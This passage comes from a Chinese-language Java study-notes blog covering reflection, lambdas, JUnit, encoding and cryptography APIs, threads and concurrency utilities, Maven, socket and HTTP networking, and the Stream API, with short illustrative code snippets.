class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><p>Class 类，是反射的核心类。创建一个类，内存中就对应生成一个Class对象，结构也会存在Class对象中。</p>
<p>功能：</p>
<ul>
<li>对象所属类</li>
<li>访问对象的所有属性和方法</li>
<li>处理注解</li>
<li>对性能有影响</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取类型</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">getAnnotation();</span><br><span class="line">getMethod();</span><br><span class="line">newInstance();</span><br><span class="line">getName();</span><br><span class="line">getSuperClass();</span><br><span class="line">getInterfaces();</span><br><span class="line">getClassLoader();</span><br><span class="line">getConstructors();</span><br><span class="line">getMethod(String name, Class ...);</span><br><span class="line">getDeclaredFields();</span><br></pre></td></tr></table></figure>

<p>获取Class对象的方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Student.class;</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> student.getClass();</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Integer.TYPE; <span class="comment">// 内置类型特有</span></span><br><span class="line"><span class="comment">// Class Loader 方法</span></span><br></pre></td></tr></table></figure>

<p>可以创建Class对象的类型：</p>
<ul>
<li>类</li>
<li>接口</li>
<li>数组</li>
<li>枚举</li>
<li>注解</li>
<li>void </li>
<li>基本数据类型</li>
</ul>
<p>程序 类加载过程：</p>
<ol>
<li>class文件加载到内存，并同时生成对应的Class对象</li>
<li>链接，初始化为 0</li>
<li>执行<code>&lt;clinit&gt;()</code>，合并所有的类内静态代码块，并执行。</li>
</ol>
<p>类加载器：</p>
<ul>
<li>引导类加载器：JVM自带的类加载器，用于装载核心类，无法直接获取。 <code>jre/lib/rt.jar</code></li>
<li>扩展类加载器：<code>jre/lib/ext</code></li>
<li>系统类加载器：<code>java.class.path</code> <code>CLASS_PATH</code>下的包，最常用</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">systemClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">systemClassLoader.getParent(); <span class="comment">// 扩展类加载器</span></span><br><span class="line">systemClassLoader.getParent().getParent(); <span class="comment">// 根加载器 返回 null 因为是由 C/C++ 编写</span></span><br><span class="line"></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.String&quot;</span>).getClassLoader();</span><br></pre></td></tr></table></figure>

<p>使用Class对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line"><span class="comment">// 名称</span></span><br><span class="line">c.getName();  <span class="comment">// packagename.classname</span></span><br><span class="line">c.getSimpleName();  <span class="comment">// classname</span></span><br><span class="line"><span class="comment">// 属性</span></span><br><span class="line">Field[] fields = c.getFields();  <span class="comment">// public</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">Field[] fields = c.getDeclaredFields();  <span class="comment">// private</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="comment">// 方法</span></span><br><span class="line">Method[] methods = c.getMethods();  <span class="comment">// public + object.public</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getName&quot;</span>, <span class="literal">null</span>); <span class="comment">// null 表示 参数</span></span><br><span class="line">Method[] methods = c.getDeclaredMethods();   <span class="comment">// private 只有本类的</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造对象</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> (String)c.newInstance();  <span class="comment">// Object = String</span></span><br><span class="line"><span class="comment">// 调用方法</span></span><br><span class="line">method.invoke(str, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>); <span class="comment">// 关闭 private 权限检测，也可以提高效率</span></span><br><span class="line">field.set(str, <span class="string">&quot;321&quot;</span>);</span><br><span class="line"><span class="comment">// 操作泛型</span></span><br><span class="line">Typep[] genInfos = method.getGenericParameterTypes(); <span class="comment">// 获取泛型参数信息</span></span><br><span class="line"><span class="keyword">for</span>(Type info: genInfos)&#123;</span><br><span class="line">    <span class="keyword">if</span>(info <span class="keyword">instanceof</span> ParameterizedType)&#123;</span><br><span class="line">        Type[] subInfos = ((ParameterizedType)info).getActualTypeArguments();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 操作注解</span></span><br><span class="line"><span class="comment">// c -&gt; Class 对象 String</span></span><br><span class="line">Annotation[] annotations = c.getAnnotations();  <span class="comment">// 获取 String 的注解</span></span><br><span class="line"><span class="type">Annotation</span> <span class="variable">annotation</span> <span class="operator">=</span> c.getAnnotation(SuppressWarnings.class);</span><br><span class="line"><span class="type">SuppressWarnings</span> <span class="variable">swanno</span> <span class="operator">=</span> (SuppressWarnings)annotation;</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="type">SuppressWarnings</span> <span class="variable">fsw</span> <span class="operator">=</span> (SuppressWarnings)c.getAnnotation(SuppressWarnings.class);</span><br><span class="line"><span class="comment">// 获取注解的 value</span></span><br><span class="line">swanno.value();</span><br><span class="line">fsw.type();</span><br></pre></td></tr></table></figure>

<h1 id="Lambda"><a href="#Lambda" class="headerlink" title="Lambda"></a>Lambda</h1><p>直接使用方法引用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Arrays.sort(array, SortedBy::ignoreCase); <span class="comment">// 静态方法</span></span><br><span class="line">Arrays.sort(array, SortedBy::compareTo); <span class="comment">// 实例方法</span></span><br><span class="line">Arrays.sort(array, SortedBy::<span class="keyword">new</span>); <span class="comment">// 构造方法</span></span><br></pre></td></tr></table></figure>

<h1 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testFun</span><span class="params">()</span> &#123;</span><br><span class="line">        assertEquals(<span class="number">3</span>, <span class="number">1</span>+<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Before</span></span><br><span class="line"><span class="meta">@After</span></span><br><span class="line"><span class="meta">@BeforeClass</span></span><br><span class="line"><span class="meta">@AfterClass</span></span><br><span class="line"><span class="comment">// 异常测试</span></span><br><span class="line"><span class="meta">@Test(expected=Exception.class)</span></span><br><span class="line"><span class="comment">// 参数化测试</span></span><br><span class="line"><span class="meta">@Parameters</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Collection&lt;?&gt; data() &#123;<span class="keyword">return</span> ...&#125;</span><br><span class="line"><span class="meta">@RunWith</span></span><br><span class="line"><span class="comment">// 超时</span></span><br><span class="line"><span class="meta">@Test(timeout=1000)</span></span><br></pre></td></tr></table></figure>

<h1 id="编码与加密"><a href="#编码与加密" class="headerlink" title="编码与加密"></a>编码与加密</h1><p>编码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// URL</span></span><br><span class="line">URLEncoder.encode(<span class="string">&quot;123&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">URLEncoder.decode(<span class="string">&quot;%E5%8F&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"><span class="comment">// BASE 64</span></span><br><span class="line">Base64.getEncoder().encodeToString(<span class="string">&quot;123&quot;</span>.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">Base64.getDecoder().decode(b64, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">Base64.getUrlEncoder().encodeToString(<span class="string">&quot;123&quot;</span>.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">Base64.getUrlDecoder().decode(b64, <span class="string">&quot;UTF-8&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>摘要</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// MD5</span></span><br><span class="line"><span class="type">MessageDigest</span> <span class="variable">md</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">md.update(<span class="string">&quot;123&quot;</span>.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">md.update(data2);</span><br><span class="line"><span class="type">byte</span>[] result = md.digest();</span><br><span class="line"><span class="comment">// SHA-1</span></span><br><span class="line"><span class="type">MessageDigest</span> <span class="variable">md</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;SHA-1&quot;</span>);</span><br><span class="line">md.update(<span class="string">&quot;123&quot;</span>.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">md.update(data2);</span><br><span class="line"><span class="type">byte</span>[] result = md.digest();</span><br><span class="line"><span class="comment">// 第三方</span></span><br><span class="line">Security.addProvider(<span class="keyword">new</span> <span class="title class_">BouncyCastleProvider</span>());</span><br><span class="line"><span class="type">MessageDigest</span> <span class="variable">md</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;RipeMD160&quot;</span>);</span><br><span class="line">md.update(<span class="string">&quot;123&quot;</span>.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">md.update(data2);</span><br><span class="line"><span class="type">byte</span>[] result = md.digest();</span><br><span class="line"><span class="comment">// HmacMD5</span></span><br><span class="line"><span class="type">KeyGenerator</span> <span class="variable">keygen</span> <span class="operator">=</span> KeyGenerator.getInstance(<span class="string">&quot;HmacMD5&quot;</span>);</span><br><span class="line"><span class="type">SecretKey</span> <span class="variable">skey</span> <span class="operator">=</span> keygen.generateKey();</span><br><span class="line"><span class="type">Mac</span> <span class="variable">mac</span> <span class="operator">=</span> Mac.getInstance(<span class="string">&quot;HmacMD5&quot;</span>);</span><br><span class="line">mac.init(skey);</span><br><span class="line">mac.update(data);</span><br><span class="line"><span class="type">byte</span>[] result = mac.doFinal();</span><br></pre></td></tr></table></figure>

<p>加密</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AES</span></span><br><span class="line"><span class="type">String</span> <span class="variable">CIPHER_NAME</span> <span class="operator">=</span> <span class="string">&quot;AES/ECB/PKCS5Padding&quot;</span>;</span><br><span class="line"><span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(CIPHER_NAME);</span><br><span class="line"><span class="type">SecretKeySpec</span> <span class="variable">keyspec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(key, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">cipher.init(Cipher.ENCRYPT_MODE, keyspec);</span><br><span class="line"><span class="comment">// cipher.init(Cipher.DECRYPT_MODE, keyspec);</span></span><br><span class="line"><span class="keyword">return</span> cipher.doFinal(input);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 密钥交换 DH 算法</span></span><br><span class="line"><span class="type">KeyPairGenerator</span> <span class="variable">kpGen</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DH&quot;</span>);</span><br><span class="line">kpGen.initialize(<span class="number">512</span>);</span><br><span class="line"><span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpGen.generateKeyPair();</span><br><span class="line">privateKey = kp.getPrivate();</span><br><span class="line">publicKey = kp.getPublic();</span><br><span class="line"><span class="comment">// 收到 publicKey 后</span></span><br><span class="line">keySpec = <span class="keyword">new</span> <span class="title class_">X509EncodedKeySpec</span>(publicKeyBytes);</span><br><span class="line">kf = KeyFacotry.getInstance(<span class="string">&quot;DH&quot;</span>);</span><br><span class="line">publicKey = kf.generatePublic(keySpec);</span><br><span class="line">keyAgreement = KeyAgreement.getInstance(<span class="string">&quot;DH&quot;</span>);</span><br><span class="line">keyAgreement.init(<span class="built_in">this</span>.privateKey)</span><br><span class="line">keyAgreement.doPhase(publicKey, <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// RSA</span></span><br><span class="line"><span class="type">KeyPairGenerator</span> <span class="variable">kpGen</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;RSA&quot;</span>);</span><br><span class="line">kpGen.initialize(<span class="number">1024</span>);</span><br><span class="line"><span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpGen.generateKeyPair();</span><br><span class="line">privateKey = kp.getPrivate();</span><br><span class="line">publicKey = kp.getPublic();</span><br><span class="line"><span class="comment">// 加解密</span></span><br><span class="line"><span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;RSA&quot;</span>);</span><br><span class="line">cipher.init(Cipher.ENCRYPT_MODE, publicKey);</span><br><span class="line"><span class="comment">// cipher.init(Cipher.DECRYPT_MODE, privateKey);</span></span><br><span class="line"><span class="keyword">return</span> cipher.doFinal(input);</span><br></pre></td></tr></table></figure>

<p>签名</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>数字证书</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><p>创建。</p>
<p>方法一：继承Thread类，重写run方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span> <span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>方法二：实现Runnable接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyThread</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>lambda方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123; &#125;);</span><br></pre></td></tr></table></figure>

<p>线程方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">start() 启动</span><br><span class="line">stop() 强制结束</span><br><span class="line">join() 等待</span><br></pre></td></tr></table></figure>

<p>异常：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InterruptedException e; <span class="comment">//中断异常</span></span><br></pre></td></tr></table></figure>

<p>线程间的共享数据，用<code>volatile</code>修饰</p>
<p>守护线程：</p>
<ul>
<li><p>不能持有任何资源</p>
</li>
<li><p>系统结束时结束守护线程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setDaemon(<span class="literal">true</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<p>线程同步</p>
<ul>
<li><p>可以同步代码块</p>
</li>
<li><p>可以同步方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">synchronized</span>(lock) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>基本类型赋值，引用类型赋值都是原子操作。</p>
<p>一般对于需要同步的数据，封装成对象，将其中的方法改为同步方法。此时锁住的则是<code>this</code>或<code>A.class</code>。</p>
<p>可重入锁：某个线程多次获取同一个锁。</p>
<p>多线程协调：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.wait()  <span class="comment">// 线程主动进入等待状态，期间释放一次锁，再获得一次锁</span></span><br><span class="line"><span class="built_in">this</span>.notify()  <span class="comment">// 唤醒一个等待this锁的线程，但是不释放锁</span></span><br></pre></td></tr></table></figure>

<p>线程同步工具类：<code>concurrent</code></p>
<p>ReentrantLock 需要手动释放的锁</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Lock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line">lock.lock();  <span class="comment">// 可能会失败</span></span><br><span class="line">lock.tryLock();  <span class="comment">// 尝试获取，可以设置超时时间</span></span><br><span class="line"><span class="keyword">try</span>&#123;  &#125;</span><br><span class="line"><span class="keyword">finally</span>&#123;</span><br><span class="line">    lock.unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ReadWriteLock 读时可多线程同时获取锁，写时只允许一个锁</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Lock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantReadWriteLock</span>();</span><br><span class="line"><span class="type">Lock</span> <span class="variable">r</span> <span class="operator">=</span> lock.readLock();</span><br><span class="line"><span class="type">Lock</span> <span class="variable">w</span> <span class="operator">=</span> lock.writeLock();</span><br></pre></td></tr></table></figure>

<p>Condition 实现wait、notify功能</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lock.newCondition();</span><br><span class="line">await(); <span class="comment">// 相当于 wait</span></span><br><span class="line">signalAll();  <span class="comment">// 相当于 notifyAll</span></span><br></pre></td></tr></table></figure>

<p>Concurrent 线程安全集合</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CopyOnWriteArrayList</span><br><span class="line">ConcurrentHashMap</span><br><span class="line">CopyOnWriteArraySet</span><br><span class="line">ArrayBlockingQueue</span><br><span class="line">LinkedBlockingQueue</span><br><span class="line">LinkedBlockingDeque</span><br></pre></td></tr></table></figure>

<p>原子操作 CAS 操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AtomicInteger value;</span><br><span class="line">AtomicIntegerArray values;</span><br><span class="line">addAndGet();</span><br><span class="line">get();</span><br></pre></td></tr></table></figure>

<p>ExecutorService 线程池</p>
<ul>
<li><p>FixedThreadPool</p>
</li>
<li><p>CachedThreadPool</p>
</li>
<li><p>SingleThreadExecutor</p>
</li>
<li><p>ScheduleThreadPool 包括固定速率和固定间隔</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ExecutorService</span> <span class="variable">exe</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">4</span>);</span><br><span class="line">exe.submit(task);</span><br><span class="line"><span class="comment">// ... </span></span><br><span class="line">exe.shutdown();</span><br></pre></td></tr></table></figure></li>
</ul>
<p>Future 获取线程的返回值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Callable&lt;String&gt; task = <span class="keyword">new</span> <span class="title class_">Task</span>();</span><br><span class="line">Future&lt;String&gt; futrue = exe.submit(task);</span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> future.get(); <span class="comment">// 阻塞</span></span><br><span class="line">cancel()</span><br><span class="line">isDone()</span><br></pre></td></tr></table></figure>

<p>CompletableFuture 任务结束后自动调用回调函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CompletableFuture&lt;String&gt; cf = getCompletableFutureFromSomewhere(); <span class="comment">// Supplier</span></span><br><span class="line">cf.thenAccept((result) -&gt; &#123;&#125;);</span><br><span class="line">cf.exceptionally((exception) -&gt; &#123;&#125;);</span><br><span class="line"><span class="comment">// 还可以串行执行</span></span><br><span class="line">cf2 = cf.thenApplyAsync();</span><br><span class="line">cf3 = cf2.thenApplyAsync();</span><br><span class="line"><span class="comment">// 还可以并行执行</span></span><br><span class="line">&lt;Object&gt;cf = CompletableFuture.anyOf(); <span class="comment">// 任意一个完成就调用thenAccept</span></span><br><span class="line">&lt;Void&gt;cf = CompletableFuture.allOf(); <span class="comment">// 都完成就调用thenAccept</span></span><br><span class="line">cf.thenAccept();</span><br></pre></td></tr></table></figure>

<p>Fork&#x2F;Join 可以拆分任务为多个小任务并行计算</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SumTask</span> <span class="keyword">extends</span> <span class="title class_">RecursiveTask</span>&lt;Long&gt; &#123; <span class="comment">// 或 RecursiveAction</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Long <span class="title function_">compute</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">SumTask</span> <span class="variable">sub1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SumTask</span>();</span><br><span class="line">        <span class="type">SumTask</span> <span class="variable">sub2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SumTask</span>();</span><br><span class="line">        invokeAll(sub1, sub2);</span><br><span class="line">        res1 = fork1.join();</span><br><span class="line">        res2 = fork2.join();</span><br><span class="line">        <span class="keyword">return</span> res1 + res2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ForkJoinPool.commonPool().invoke(task);</span><br><span class="line">Arrays.parallelSort(); <span class="comment">// 并行排序</span></span><br></pre></td></tr></table></figure>

<p>工具类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取当前线程</span></span><br><span class="line">Thread.currentThread(); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 同一线程内绑定全局对象</span></span><br><span class="line"><span class="keyword">static</span> ThreadLocal&lt;String&gt; tl = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();</span><br><span class="line">tl.set();</span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> tl.get();</span><br><span class="line">tl.remove();</span><br></pre></td></tr></table></figure>

<h1 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h1><p>要求代码目录命名规范。</p>
<p>依赖关系：</p>
<ul>
<li>compile</li>
<li>test</li>
<li>runtime</li>
<li>provided 编译时需要，运行时不需要</li>
</ul>
<h1 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h1><p>TCP</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Socket</span> <span class="variable">sock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(InetAddress, port);</span><br><span class="line">sock.getInputStream();</span><br><span class="line">sock.getOutputStream();</span><br><span class="line"></span><br><span class="line"><span class="type">ServerSocket</span> <span class="variable">sock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(port);</span><br><span class="line"><span class="type">Socket</span> <span class="variable">sk</span> <span class="operator">=</span> sock.accept();</span><br><span class="line">sock.getInputStream();</span><br><span class="line">sock.getOutputStream();</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">bindAddr = InetAddress.getByAddress(<span class="keyword">new</span> <span class="title class_">byte</span>[] &#123;<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>&#125;);</span><br><span class="line"><span class="type">ServerSocket</span> <span class="variable">sock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(port, backlog, bindAddr);</span><br></pre></td></tr></table></figure>

<p>UDP</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">DatagramSocket</span> <span class="variable">sock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>()</span><br><span class="line">sock.connect(addr, <span class="number">9090</span>); </span><br><span class="line"><span class="type">DatagramPacket</span> <span class="variable">packet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(data, data.length);</span><br><span class="line">sock.send(packet);</span><br><span class="line">resp = <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(buffer, buffer.length);</span><br><span class="line">sock.receive(resp);</span><br></pre></td></tr></table></figure>

<p>HTTP</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GET</span></span><br><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="type">HttpURLConnection</span> <span class="variable">conn</span> <span class="operator">=</span> (HttpURLConnection) url.openConnection();</span><br><span class="line"><span class="type">int</span> <span class="variable">code</span> <span class="operator">=</span> conn.getResponseCode();</span><br><span class="line"><span class="keyword">try</span>(<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> conn.getInputStream()) &#123;</span><br><span class="line">    <span class="comment">// read data</span></span><br><span class="line">&#125;</span><br><span class="line">conn.disconnect();</span><br><span class="line"></span><br><span class="line"><span class="comment">// POST</span></span><br><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="type">byte</span>[] postData = <span class="string">&quot;&quot;</span>.getBytes(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"><span class="type">HttpURLConnection</span> <span class="variable">conn</span> <span class="operator">=</span> (HttpURLConnection) url.openConnection();</span><br><span class="line">conn.setRequestMethod(<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">conn.setDoOutput(<span class="literal">true</span>);</span><br><span class="line">conn.setRequestProperty(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">conn.setRequestProperty(<span class="string">&quot;Content-length&quot;</span>, String.valueOf(postData.length));</span><br><span class="line"><span class="keyword">try</span>(<span class="type">OutputStream</span> <span class="variable">out</span> <span class="operator">=</span> conn.getOutputStream())&#123;</span><br><span class="line">    out.write(postData);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="variable">code</span> <span class="operator">=</span> conn.getResponseCode();</span><br><span class="line"><span class="keyword">try</span>(<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> conn.getInputStream()) &#123;</span><br><span class="line">    <span class="comment">// read data</span></span><br><span class="line">&#125;</span><br><span class="line">conn.disconnect();</span><br></pre></td></tr></table></figure>

<h1 id="Stream-util"><a href="#Stream-util" class="headerlink" title="Stream util"></a>Stream util</h1><p>表示任意Java对象，用于内存计算，业务逻辑。实时计算，惰性计算。</p>
<ul>
<li><p>可以存储无限个元素</p>
</li>
<li><p>可以转换为另一个Steam</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Stream&lt;BigInteger&gt; naturals = createNaturalSteam();</span><br><span class="line">naturals.map((n) -&gt; n.multiply(n))</span><br><span class="line">      .limit(<span class="number">100</span>)</span><br><span class="line">      .forEach(System.out::println);</span><br></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Stream&lt;Integer&gt; s = Stream.of(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">Stream&lt;Integer&gt; s = Arrays.stream(oneArray);</span><br><span class="line">Stream&lt;Integer&gt; s = oneList.stream();</span><br><span class="line">Stream&lt;T&gt; s = Stream.generate(Supplier&lt;T&gt; s); <span class="comment">// 实时计算新元素</span></span><br><span class="line">Stream&lt;String&gt; lines = Files.lines();  <span class="comment">// 文件变Stream</span></span><br></pre></td></tr></table></figure>

<p>Map 方法，对序列的每个元素施加一个操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Stream&lt;Integer&gt; s2 = s1.map((n) -&gt; n * n);  <span class="comment">// Functional</span></span><br></pre></td></tr></table></figure>

<p>Filter 方法，对每个元素测试过滤</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Stream&lt;Integer&gt; s2 = s1.filter((n) -&gt; n % <span class="number">2</span> == <span class="number">1</span>); <span class="comment">// Predicate</span></span><br></pre></td></tr></table></figure>

<p>Reduce 方法，对元素聚合</p>
